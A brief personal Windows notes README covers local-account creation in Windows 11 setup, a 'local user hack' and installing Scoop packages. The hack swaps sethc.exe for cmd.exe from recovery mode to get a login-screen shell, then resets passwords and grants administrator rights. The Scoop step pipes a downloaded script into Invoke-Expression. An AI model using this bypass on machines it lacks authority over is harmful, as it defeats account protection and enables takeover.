# winask
windows asker

# user hack

## add local user
windows 11 local account
1. ```[fn] + [shift] + [f10]```
2. ```start ms-cxh:localonly```

## local user hack
* restart to firmware, ```[shift] + [click]``` on restart

* open ```cmd``` console
```
c:
cd \windows\system32
rename sethc sethc-2
rename cmd sethc
```
* rename ```sethc```, then rename ```cmd``` to ```sethc```

* press ```[shift]``` 5 times
```
net localgroup administrators
net user <username> *
```
* change password

* add a user to administrators
```
net localgroup administrators <username> /add
```

# install scoop
using powershell
```
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser
Invoke-RestMethod -Uri https://get.scoop.sh | Invoke-Expression
```
install any package like ngrok, nodejs, git and php
```
scoop install ngrok
scoop install nodejs
scoop install git
scoop bucket add versions
scoop install php84
```

# end of line
nothing more here




